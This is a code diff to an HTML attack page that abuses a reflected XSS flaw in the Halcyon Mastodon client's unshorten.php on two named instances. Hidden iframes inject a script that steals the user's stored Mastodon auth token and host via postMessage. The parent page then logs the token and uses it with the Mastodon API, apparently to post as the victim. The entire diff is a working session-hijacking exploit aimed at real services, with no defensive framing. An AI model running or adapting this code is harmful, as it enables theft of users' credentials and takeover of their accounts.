@@ -27,12 +27,16 @@
     <script src="jquery-3.5.1.min.js"></script>
     <script src="mastodon.js"></script>
     <script>
+      const rootDomain = s => {
+        const r = /.*\.([^.]*[^0-9][^.]*\.[^.]*[^.0-9][^.]*$)/;
+        return s.replace(r, '$1');
+      };
       // post #gumba2 baby!
       window.onmessage = ({
-        data: token
+        data: [token, host]
       }) => {
         const api = new MastodonAPI({
-          instance: "https://mstdn.social",
+          instance: "https://" + rootDomain(host),
           api_user_token: token
         });
         console.log('Token:', token)
@@ -56,8 +60,12 @@
         })
       }
     </script>
+    <!-- A couple of them -->
     <iframe title="xss"
-      src="https://halcyon.mstdn.social/unshorten.php?url=%3Cscript%3Etop.postMessage(localStorage.current_authtoken, '*')%3C/script%3E"
+      src="https://halcyon.mstdn.social/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, location.host], '*')%3C/script%3E"
+      frameborder="0" style="display: none;"></iframe>
+    <iframe title="xss"
+      src="https://halcyon.tilde.zone/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, location.host], '*')%3C/script%3E"
       frameborder="0" style="display: none;"></iframe>
   </body>
 
